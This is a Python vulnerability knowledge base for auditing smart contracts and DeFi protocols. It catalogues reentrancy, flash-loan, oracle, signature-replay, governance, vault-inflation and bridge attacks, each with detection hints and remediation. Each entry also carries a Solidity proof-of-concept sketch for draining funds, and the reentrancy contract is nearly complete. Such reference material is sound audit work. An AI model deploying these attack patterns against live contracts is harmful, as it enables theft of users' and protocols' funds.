"""
SPARTAN v2.0 — Web3 / Smart Contract / DeFi Vulnerability Knowledge Base
Full taxonomy with detection hints, PoC patterns, and remediation guidance.
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class Web3VulnClass:
    name: str
    swc: str          # SWC registry ID or custom label
    description: str
    detection_hints: list[str]
    attack_patterns: list[str]
    poc_template: str
    cvss_guidance: str
    remediation: str
    references: list[str] = field(default_factory=list)


WEB3_VULNERABILITIES: list[Web3VulnClass] = [

    Web3VulnClass(
        name="Reentrancy (Single-Function)",
        swc="SWC-107",
        description="External call to untrusted contract allows it to re-enter the calling function "
                    "before state is updated, enabling balance drain.",
        detection_hints=[
            "External call (call, transfer, send) before state update",
            "balance[msg.sender] decremented after .call()",
            "Checks-Effects-Interactions pattern violated",
            "Missing ReentrancyGuard modifier",
        ],
        attack_patterns=[
            "Attacker deploys contract with receive() that re-calls withdraw()",
            "Repeated withdrawals draining the vault before balance updated",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: Vulnerable.withdraw()
// Vulnerability: Reentrancy — state update after external call
// Impact: Drain entire contract balance
// Prerequisites: Attacker must have deposited at least 1 wei

contract Attack {
    Vulnerable public target;
    constructor(address _target) { target = Vulnerable(_target); }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();  // Re-enter before balance updated
        }
    }
}
// Expected result: Attacker drains target beyond own deposit
// Attacker outcome: All ETH drained from contract""",
        cvss_guidance="Critical (9.x) — direct fund loss.",
        remediation=(
            "Follow Checks-Effects-Interactions pattern strictly. "
            "Use OpenZeppelin ReentrancyGuard. "
            "Update all state before any external call."
        ),
        references=["SWC-107", "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/"],
    ),

    Web3VulnClass(
        name="Reentrancy (Cross-Function)",
        swc="SWC-107",
        description="Reentrancy across two different functions sharing the same state variable, "
                    "bypassing single-function guards.",
        detection_hints=[
            "Two functions share state that is updated in one but checked in another",
            "External call in function A, state read by function B",
            "ReentrancyGuard present but only on one function",
        ],
        attack_patterns=[
            "Re-enter function B during external call in function A",
            "Transfer triggers receive() which calls a different function than the attacker entered",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: withdraw() + transfer()
// Vulnerability: Cross-function reentrancy
// Impact: State manipulation across function boundaries

receive() external payable {
    // During withdraw(), re-enter transfer() before balances[attacker] zeroed
    target.transfer(victim, attackerBalance);
}""",
        cvss_guidance="Critical (9.x) — typically leads to fund loss or state corruption.",
        remediation=(
            "Apply ReentrancyGuard to all functions sharing mutable state. "
            "Use a single nonReentrant modifier across function groups. "
            "Audit all external call sites holistically."
        ),
        references=["SWC-107"],
    ),

    Web3VulnClass(
        name="Read-Only Reentrancy",
        swc="SWC-107",
        description="Reentrancy into a view function during a state-changing call, exploiting "
                    "stale on-chain state read by other protocols (e.g., price oracles).",
        detection_hints=[
            "Protocol uses balanceOf() or totalSupply() as oracle during a callback",
            "Curve/Balancer LP token price read during add/remove liquidity hook",
        ],
        attack_patterns=[
            "During ETH transfer callback, read stale LP price before pool state updated",
            "Use stale price to borrow excess collateral from integrated lending protocol",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: Read-only reentrancy on Curve LP oracle
// Impact: Borrow against inflated collateral price during reentrant state

receive() external payable {
    // Pool's virtual_price() returns stale (pre-withdrawal) value
    // Use it to borrow from dependent lending protocol at inflated valuation
    lendingProtocol.borrow(curvePool.get_virtual_price(), largeAmount);
}""",
        cvss_guidance="Critical — fund loss from dependent protocols.",
        remediation=(
            "Dependent protocols must not read live state from protocols "
            "mid-execution. Use a reentrancy lock at the integration layer. "
            "Prefer TWAP or manipulation-resistant oracles."
        ),
        references=["https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/"],
    ),

    Web3VulnClass(
        name="Access Control Failure",
        swc="SWC-105",
        description="Missing or incorrect access control modifiers allow unauthorized callers "
                    "to invoke privileged functions (initialize, upgrade, setOwner, drain).",
        detection_hints=[
            "Public/external functions without onlyOwner/onlyRole",
            "initialize() callable more than once",
            "transferOwnership() or admin setter lacks modifier",
            "Proxy admin functions accessible to non-admin",
        ],
        attack_patterns=[
            "Call initialize() on deployed proxy to become owner",
            "Call setOwner(attacker) on unprotected contract",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: ProxyContract.initialize()
// Vulnerability: Missing access control — initialize() callable by anyone
// Impact: Attacker becomes owner of proxy logic

VulnerableProxy proxy = VulnerableProxy(proxyAddress);
proxy.initialize(attackerAddress);  // No modifier prevents this
proxy.withdrawAll(attackerAddress); // Now attacker is owner""",
        cvss_guidance="Critical (9.x) — full contract takeover or fund drain.",
        remediation=(
            "Add onlyOwner/onlyRole to all privileged functions. "
            "Use initializer modifier (OZ Initializable) to prevent re-initialization. "
            "Audit all external/public function access controls at deployment."
        ),
        references=["SWC-105", "CWE-284"],
    ),

    Web3VulnClass(
        name="Flash Loan Attack",
        swc="CUSTOM-FLASHLOAN",
        description="Attacker borrows large amounts in a single transaction to manipulate prices, "
                    "governance votes, or vault share prices, then repays within the same tx.",
        detection_hints=[
            "Price calculated from spot reserves (Uniswap V2 getAmounts)",
            "Governance vote snapshot takeable in same block as borrowing",
            "Vault share price depends on token balance at time of deposit",
        ],
        attack_patterns=[
            "Flash borrow → manipulate Uniswap pair reserve ratio → exploit protocol using bad price",
            "Flash borrow → acquire governance tokens → pass malicious proposal → repay",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: VulnerableOracle using Uniswap V2 spot price
// Vulnerability: Flash loan price manipulation
// Impact: Drain collateral pool via artificially cheap collateral price

function attack() external {
    // 1. Flash borrow 1,000,000 WETH from Aave
    aave.flashLoan(address(this), WETH, 1_000_000e18, "");
}

function executeOperation(...) external {
    // 2. Dump WETH → USDC on the Uniswap pair (crashes WETH price)
    uniswapPair.swap(0, usdcOut, address(this), "");
    // 3. Protocol uses that pair as oracle → WETH appears cheap
    protocol.borrow(WETH, 1_000_000e18); // borrow at manipulated price
    // 4. Repay flash loan
    IERC20(WETH).approve(address(aave), 1_000_000e18 + fee);
}""",
        cvss_guidance="Critical (9.x) — typically millions in losses.",
        remediation=(
            "Use TWAP oracles (Uniswap V3 TWAP, Chainlink) instead of spot prices. "
            "Implement snapshot governance that cannot be taken in same block. "
            "Add minimum deposit / withdrawal delays for vaults."
        ),
        references=["https://docs.uniswap.org/concepts/protocol/oracle"],
    ),

    Web3VulnClass(
        name="Oracle Manipulation",
        swc="CUSTOM-ORACLE",
        description="Price or randomness oracles can be manipulated by attackers with sufficient "
                    "capital or by exploiting weak oracle designs (block.timestamp, blockhash).",
        detection_hints=[
            "spot price from AMM used directly as oracle",
            "block.timestamp used as randomness source",
            "blockhash(block.number - 1) used for randomness",
            "Single-source oracle without aggregation",
        ],
        attack_patterns=[
            "Sandwich LP reserve manipulation before oracle read",
            "Miner/validator controls block.timestamp within ~15 second window",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: block.timestamp randomness in lottery
// Vulnerability: Oracle manipulation — miner-controllable timestamp
// Impact: Validator can selectively include/exclude winning transactions

// Attacker (validator) controls block.timestamp within bounds
// They can brute-force winning condition off-chain, then include tx""",
        cvss_guidance="Critical if price manipulation. High for randomness manipulation.",
        remediation=(
            "Use Chainlink Data Feeds for prices. "
            "Use Chainlink VRF for randomness. "
            "Implement TWAP with long enough observation window (≥30 min). "
            "Never use block attributes as entropy sources."
        ),
        references=["https://docs.chain.link/vrf"],
    ),

    Web3VulnClass(
        name="Integer Overflow / Underflow",
        swc="SWC-101",
        description="Arithmetic overflow/underflow in Solidity <0.8.0 wraps silently, "
                    "enabling balance inflation or bypassing threshold checks.",
        detection_hints=[
            "Solidity version < 0.8.0 without SafeMath",
            "uint subtraction that could go below zero",
            "Token balance or share arithmetic without overflow checks",
        ],
        attack_patterns=[
            "Transfer amount > balance → underflows to MAX_UINT → infinite tokens",
            "Multiply two large values → wraps to 0 → bypasses check",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]  (Solidity <0.8.0)
// Target: Token.transfer()
// Vulnerability: Underflow on unchecked subtraction
// Impact: Balance wraps to 2^256-1 (infinite tokens)

// balances[attacker] = 0
token.transfer(victim, 1);  
// balances[attacker] = 0 - 1 → underflows to 115792089...  (2^256 - 1)""",
        cvss_guidance="Critical if token minting or balance manipulation. High otherwise.",
        remediation=(
            "Upgrade to Solidity ≥0.8.0 (built-in overflow checks). "
            "Use OpenZeppelin SafeMath for older versions. "
            "Use unchecked {} blocks ONLY for gas optimization in proven-safe arithmetic."
        ),
        references=["SWC-101"],
    ),

    Web3VulnClass(
        name="Signature Replay",
        swc="SWC-121",
        description="Signed messages reusable across transactions, chains, or contracts "
                    "due to missing nonce, chainId, or contract address in signed data.",
        detection_hints=[
            "ecrecover() used without nonce in signed message",
            "EIP-712 domain separator missing chainId or verifyingContract",
            "Signature not invalidated after first use",
            "No cross-chain replay protection",
        ],
        attack_patterns=[
            "Replay valid permit signature to repeatedly drain allowance",
            "Replay signed tx on a forked chain (missing chainId)",
            "Replay signature on different contract with same ABI",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Target: Permit-style signature without nonce tracking
// Vulnerability: Signature replay — nonce not incremented
// Impact: Repeated unauthorized transfers

bytes memory sig = getVictimSignature(); // obtained once (e.g., from mempool)
// Replay the same signature multiple times
for (uint i = 0; i < 10; i++) {
    token.permit(victim, attacker, amount, deadline, v, r, s);
    token.transferFrom(victim, attacker, amount);
}""",
        cvss_guidance="Critical — direct token theft.",
        remediation=(
            "Include nonce (per-user, incremented) in every signed message. "
            "Include chainId and contract address in EIP-712 domain separator. "
            "Track and invalidate used signatures."
        ),
        references=["SWC-121", "https://eips.ethereum.org/EIPS/eip-712"],
    ),

    Web3VulnClass(
        name="Proxy Storage Collision",
        swc="SWC-124",
        description="Storage slot collision between proxy admin variables and implementation "
                    "variables leads to overwritten state, enabling unauthorized upgrades.",
        detection_hints=[
            "Proxy and implementation use same storage slot 0",
            "Unstructured storage proxy (EIP-1967) slots not followed",
            "Implementation declares variables at slot positions used by proxy",
        ],
        attack_patterns=[
            "Implementation variable at slot 0 overwrites proxy owner at slot 0",
            "Attacker sets implementation's address-type variable to overwrite admin slot",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: Storage collision — slot 0 shared by proxy owner and impl variable
// Impact: Overwrite proxy owner → unauthorized upgrade

// Implementation's `uint256 public counter` sits at slot 0
// Proxy's `address public owner` also sits at slot 0
impl.setCounter(uint256(uint160(attackerAddress))); 
// proxy.owner is now attackerAddress → attacker can upgrade to malicious impl""",
        cvss_guidance="Critical — full protocol takeover.",
        remediation=(
            "Use EIP-1967 standard storage slots for proxy variables. "
            "Use OpenZeppelin TransparentUpgradeableProxy or UUPS. "
            "Audit storage layouts of proxy and implementation before deployment."
        ),
        references=["SWC-124", "https://eips.ethereum.org/EIPS/eip-1967"],
    ),

    Web3VulnClass(
        name="Front-Running / MEV Sandwich",
        swc="SWC-114",
        description="Attacker observes pending transaction in mempool and inserts transactions "
                    "before/after to extract value (sandwich attacks, DEX front-running).",
        detection_hints=[
            "Slippage tolerance not enforced or set to 0%",
            "Price-sensitive operations without commit-reveal",
            "Large AMM swaps without deadline or amountOutMin",
        ],
        attack_patterns=[
            "Observe victim swap → buy token before → price rises → victim caught at worse price → attacker sells",
            "Front-run oracle update to exploit wrong price briefly",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: No slippage protection on DEX swap
// Impact: Sandwich attack extracts value from victim's swap

// Attacker bot observes: victim.swap(WETH, USDC, 100e18, 0, ...)
// Step 1: Attacker buys USDC before victim (drives price up)
uniswap.swap(WETH, USDC, attackerBuyAmount, minOut, deadline);
// Step 2: Victim's swap executes at worse price (amountOutMin=0 allows any outcome)
// Step 3: Attacker sells USDC at inflated price
uniswap.swap(USDC, WETH, originalBuy + profit, minOut, deadline);""",
        cvss_guidance="High (7.x) for isolated swap. Critical for protocol-level MEV.",
        remediation=(
            "Enforce reasonable amountOutMin (slippage tolerance ≤1%). "
            "Add deadline parameter to all swaps. "
            "Use private mempools (Flashbots Protect) for sensitive transactions. "
            "Implement commit-reveal for price-sensitive operations."
        ),
        references=["SWC-114", "https://arxiv.org/abs/1904.05234"],
    ),

    Web3VulnClass(
        name="Governance Attack",
        swc="CUSTOM-GOV",
        description="Manipulating on-chain governance through flash-loan vote acquisition, "
                    "proposal front-running, or quorum gaming to pass malicious proposals.",
        detection_hints=[
            "Snapshot taken at time of vote, not at proposal creation",
            "Low quorum requirement relative to circulating supply",
            "No timelock between proposal pass and execution",
            "Token borrowable and votable without holding period",
        ],
        attack_patterns=[
            "Flash borrow governance tokens → vote on malicious proposal → repay",
            "Acquire large token position → pass proposal to drain treasury",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: Flash-loan governance attack — snapshot at vote time
// Impact: Pass malicious proposal to drain protocol treasury

// 1. Flash borrow 1M governance tokens
// 2. Vote on attacker's proposal to transferAll(treasury, attacker)
governance.castVote(maliciousProposalId, 1); // vote in favor with borrowed tokens
// 3. Repay flash loan
// 4. Wait for (short) timelock → execute proposal
governance.execute(maliciousProposalId); // drains treasury""",
        cvss_guidance="Critical — protocol treasury can be drained.",
        remediation=(
            "Use token lock periods before voting power is active. "
            "Snapshot voting power at proposal creation block. "
            "Require minimum timelock (≥48h–7 days) before execution. "
            "Set meaningful quorum thresholds."
        ),
        references=["https://blog.openzeppelin.com/governor-auditing-guide"],
    ),

    Web3VulnClass(
        name="Donation / Inflation Attack (ERC-4626)",
        swc="CUSTOM-VAULT",
        description="First depositor or large donor manipulates vault share price by donating "
                    "tokens directly to vault before others deposit, inflating the share price "
                    "to cause rounding errors that steal small depositors' funds.",
        detection_hints=[
            "ERC-4626 vault using totalAssets() based on token balance",
            "No virtual shares offset against inflation",
            "Share price = totalAssets / totalShares without safeguards",
            "First deposit can set arbitrary share price",
        ],
        attack_patterns=[
            "Deposit 1 wei → get 1 share → donate 1e18 tokens → share price = 1e18 → later depositors get 0 shares",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: ERC-4626 inflation attack
// Impact: Steal subsequent depositors' funds via share price manipulation

vault.deposit(1 wei, attacker);           // attacker gets 1 share
IERC20(asset).transfer(vault, 1e18);      // donate 1e18 directly (NOT via deposit)
// sharePrice = (1 + 1e18) / 1 = 1e18+1
// Victim deposits 0.5e18 → previewDeposit rounds to 0 shares
vault.deposit(0.5e18, victim);            // victim gets 0 shares, loses all funds""",
        cvss_guidance="High–Critical if vault funds can be drained.",
        remediation=(
            "Add virtual shares offset (OpenZeppelin v5 ERC-4626 defense). "
            "Set minimum initial deposit or mint a fixed amount to dead address. "
            "Use internal accounting rather than raw balanceOf()."
        ),
        references=["https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks"],
    ),

    Web3VulnClass(
        name="Bridge Vulnerability",
        swc="CUSTOM-BRIDGE",
        description="Cross-chain bridges can be attacked via message forgery, double-spend, "
                    "validator compromise, or re-org exploitation.",
        detection_hints=[
            "Message authentication relies on off-chain relayers with weak key security",
            "No replay protection on bridge messages",
            "Finality assumptions not matching source chain reorg risk",
            "Admin keys controlling bridge with insufficient multisig threshold",
        ],
        attack_patterns=[
            "Forge unlock message on destination chain (Nomad-style)",
            "Replay bridge message after reorg on source chain",
            "Compromise validator set (Ronin-style private key theft)",
        ],
        poc_template="""// [PoC — SAFE/LOCAL/SIMULATED]
// Vulnerability: Weak message authentication — default root accepted
// Impact: Forge arbitrary unlock messages to drain bridge funds

// Nomad-style: initial trusted root = 0x00...00
// Any message with root 0x00...00 passes verification
bytes32 maliciousRoot = bytes32(0);
bridge.process(maliciousRoot, abi.encode(attacker, TOKEN, 100_000_000e6));""",
        cvss_guidance="Critical — billions historically lost in bridge hacks.",
        remediation=(
            "Use battle-tested bridge architecture (LayerZero, Wormhole). "
            "Require high multisig thresholds for validator sets. "
            "Implement circuit breakers / rate limits on large withdrawals. "
            "Wait for finality (not just inclusion) before processing messages."
        ),
        references=["https://rekt.news/nomad-rekt/", "https://rekt.news/ronin-rekt/"],
    ),
]

# Lookup dict
WEB3_VULN_MAP: dict[str, Web3VulnClass] = {v.name: v for v in WEB3_VULNERABILITIES}


def get_web3_checklist() -> str:
    """Return a formatted checklist of all Web3 vulnerability classes."""
    lines = ["## Web3 / Smart Contract Vulnerability Checklist\n"]
    for v in WEB3_VULNERABILITIES:
        lines.append(f"- [ ] **{v.name}** ({v.swc})")
    return "\n".join(lines)
